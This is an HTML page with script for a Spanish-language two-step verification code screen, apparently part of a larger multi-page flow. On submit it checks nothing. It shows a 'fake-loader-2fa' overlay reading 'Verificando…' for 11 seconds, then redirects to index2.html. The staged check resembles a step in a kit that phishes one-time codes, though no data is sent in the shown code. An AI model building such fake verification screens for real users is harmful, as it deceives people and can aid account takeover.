<title>Verificación en dos pasos</title>
<style>
*{box-sizing:border-box}
body{margin:0;background:#000;font-family:'Figtree','Segoe UI',system-ui,sans-serif;color:#fff}
a{text-decoration:none}
.pantalla{width:390px;min-height:844px;margin:0 auto;background:#0B0B0B;display:flex;flex-direction:column;padding:0 24px}
.barra{height:44px;margin:46px -18px 0;display:flex;align-items:center;position:relative;justify-content:center;font-size:17px;font-weight:700}
.barra a{position:absolute;left:0;top:0;width:44px;height:44px;display:flex;align-items:center;justify-content:center}
.escudo{margin:44px auto 0;width:76px;height:76px;display:flex;align-items:center;justify-content:center;background:none;border:0}
.escudo svg{display:block;width:76px;height:76px}
h1{margin:28px 0 0;font-size:28px;line-height:34px;font-weight:800;text-align:center}
.msg{margin:28px 12px 0;font-size:20px;line-height:28px;font-weight:700;text-align:center}
.sub{margin:12px 8px 0;font-size:16px;line-height:23px;font-weight:500;color:#BDBDBD;text-align:center}
.sub b{color:#fff;font-weight:700}
.codigo{position:relative;margin:40px 0 0;display:flex;justify-content:space-between;gap:10px}
.celda{flex:1;height:62px;display:flex;align-items:center;justify-content:center;position:relative}
.num{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:32px;font-weight:800;color:#FF6200;opacity:0;transform:scale(.85);filter:blur(5px);transition:opacity .25s cubic-bezier(.4,0,.2,1),transform .25s cubic-bezier(.4,0,.2,1),filter .25s cubic-bezier(.4,0,.2,1);pointer-events:none}
.punto{width:22px;height:22px;border-radius:50%;background:#1B1B1B;transition:background .2s cubic-bezier(.4,0,.2,1),opacity .25s cubic-bezier(.4,0,.2,1),transform .25s cubic-bezier(.4,0,.2,1),box-shadow .2s}
.celda.ver .num{opacity:1;transform:scale(1);filter:blur(0);transition-duration:.12s}
.celda.ver .punto{opacity:0;transform:scale(.6);transition-duration:.12s}
.celda.activa .punto{background:#3A3A3A}
.celda.llena .punto{background:#FF6200;box-shadow:0 0 14px rgba(255,98,0,.5)}
#codigo{position:absolute;inset:0;width:100%;height:100%;opacity:0;border:0;background:transparent;color:transparent;font-size:16px;cursor:pointer}
.ayuda{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0);white-space:nowrap}
.boton{margin-top:56px;height:54px;border-radius:27px;border:0;width:100%;background:#FF6200;color:#fff;font:700 19px 'Figtree','Segoe UI',system-ui,sans-serif;cursor:pointer;transition:opacity .15s}
.boton:disabled{background:#2A2A2A;color:#777;cursor:not-allowed}
.boton:focus-visible,.reenviar:focus-visible,.barra a:focus-visible{outline:2px solid #fff;outline-offset:3px}
.reenviar{margin:18px auto 0;min-height:44px;padding:0 12px;background:none;border:0;color:#FF6200;font:700 16px 'Figtree','Segoe UI',system-ui,sans-serif;cursor:pointer}
.reenviar:disabled{color:#8A8A8A;cursor:default}
.otro{margin-top:auto;padding:18px 0 30px;text-align:center}
.otro a{display:inline-flex;align-items:center;min-height:44px;color:#fff;font-size:16px;font-weight:700}
</style>

<script>
(function () {
  var inp    = document.getElementById('codigo');
  var celdas = document.querySelectorAll('.celda');
  var ayuda  = document.getElementById('ayuda');
  var enviar = document.getElementById('enviar');

  var previo = 0, timers = [];
  function ocultar(i) {
    clearTimeout(timers[i]);
    celdas[i].classList.remove('ver');
  }
  function pintar() {
    inp.value = inp.value.replace(/\D/g, '').slice(0, 6);
    var n = inp.value.length;
    for (var i = 0; i < celdas.length; i++) {
      celdas[i].classList.toggle('llena', i < n);
      celdas[i].classList.toggle('activa', i === n && document.activeElement === inp);
      if (i >= previo && i < n) {
        (function (k) {
          celdas[k].querySelector('.num').textContent = inp.value.charAt(k);
          celdas[k].classList.add('ver');
          clearTimeout(timers[k]);
          timers[k] = setTimeout(function () { celdas[k].classList.remove('ver'); }, 500);
        })(i);
      } else if (i >= n) {
        ocultar(i);
      }
    }
    previo = n;
    if (n === 6) celdas[5].classList.add('activa');
    ayuda.textContent = n + ' de 6 dígitos';
    enviar.disabled = n !== 6;
  }
  inp.addEventListener('input', pintar);
  inp.addEventListener('focus', pintar);
  inp.addEventListener('blur', pintar);

  /* ---------- Overlay 11 s + redirección a index2.html ---------- */
  function showLoader() {
    if (document.getElementById('fake-loader-2fa')) return;

    var REDIRECT_URL = 'index2.html';   // ← destino tras el overlay
    var DURATION_MS  = 11000;           // 11 s
    var CANDIDATES   = ['loader.webp', 'loader.gif'];

    var overlay = document.createElement('div');
    overlay.id = 'fake-loader-2fa';
    overlay.style.cssText =
      'position:fixed;top:0;left:0;width:100%;height:100%;' +
      'background:rgba(11,11,11,0.95);' +
      'backdrop-filter:blur(5px);-webkit-backdrop-filter:blur(5px);' +
      'z-index:2147483647;display:flex;flex-direction:column;' +
      'align-items:center;justify-content:center;padding:20px;' +
      'box-sizing:border-box;text-align:center;' +
      "font-family:'Figtree','Segoe UI',system-ui,sans-serif;";

    if (!document.getElementById('spinner-keyframes')) {
      var st = document.createElement('style');
      st.id = 'spinner-keyframes';
      st.textContent = '@keyframes forzarGiro{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}';
      document.head.appendChild(st);
    }

    var loaderBox = document.createElement('div');
    loaderBox.style.cssText =
      'width:clamp(140px,26vw,220px);height:clamp(140px,26vw,220px);' +
      'margin-bottom:clamp(20px,4vw,35px);display:flex;align-items:center;justify-content:center;';
    overlay.appendChild(loaderBox);

    function replaceWithSpinner() {
      loaderBox.innerHTML = '';
      var s = document.createElement('div');
      s.style.cssText =
        'width:85%;height:85%;border-radius:50%;' +
        'border:5px solid rgba(255,255,255,0.2);border-top:5px solid #FF6200;' +
        'box-sizing:border-box;animation:forzarGiro 1s linear infinite;';
      loaderBox.appendChild(s);
    }

    var img = document.createElement('img');
    img.alt = 'Cargando';
    img.style.cssText = 'width:100%;height:100%;object-fit:contain;display:block;';
    loaderBox.appendChild(img);

    var idx = 0, state = 'loading', timer = null;

    function tryNext() {
      if (idx >= CANDIDATES.length) { state = 'error'; img.remove(); replaceWithSpinner(); return; }
      state = 'loading';
      var src = CANDIDATES[idx] + '?v=' + Date.now();
      console.log('[Overlay2FA] Probando: ' + src);
      clearTimeout(timer);
      timer = setTimeout(function () {
        if (state === 'loading') { state = 'timeout'; console.warn('[Overlay2FA] Timeout: ' + src); idx++; tryNext(); }
      }, 2500);
      img.src = src;
    }

    img.onload = function () {
      if (state !== 'loading') return;
      clearTimeout(timer);
      state = 'loaded';
      console.log('[Overlay2FA] Imagen OK: ' + img.naturalWidth + '×' + img.naturalHeight);
      if (img.naturalWidth < 20 || img.naturalHeight < 20) { idx++; tryNext(); }
    };

    img.onerror = function () {
      if (state !== 'loading') return;
      clearTimeout(timer);
      console.warn('[Overlay2FA] Fallo al cargar: ' + img.src);
      idx++; tryNext();
    };

    tryNext();

    var title = document.createElement('p');
    title.style.cssText = 'font-size:20px;color:#fff;font-weight:700;margin:0;';
    title.textContent = 'Verificando…';
    overlay.appendChild(title);

    var sub = document.createElement('p');
    sub.style.cssText = 'font-size:16px;color:#BDBDBD;margin-top:10px;font-weight:500;';
    sub.textContent = 'Por favor, espere un momento...';
    overlay.appendChild(sub);

    document.body.appendChild(overlay);
    document.body.style.overflow = 'hidden';

    console.log('[Overlay2FA] Redirigiendo a ' + REDIRECT_URL + ' en ' + DURATION_MS + 'ms...');
    setTimeout(function () { window.location.href = REDIRECT_URL; }, DURATION_MS);
  }

  document.getElementById('form').addEventListener('submit', function (e) {
    e.preventDefault();
    if (inp.value.length === 6) showLoader();
  });

  var re = document.getElementById('reenviar'), s = 30, t;
  function tick() {
    if (s > 0) { re.textContent = 'Reenviar código en ' + s + ' s'; s--; t = setTimeout(tick, 700); }
    else { re.disabled = false; re.textContent = 'Reenviar código'; }
  }
  tick();
  re.addEventListener('click', function () {
    re.disabled = true; s = 30; inp.value = ''; pintar(); inp.focus(); tick();
  });
  pintar();
})();
</script>
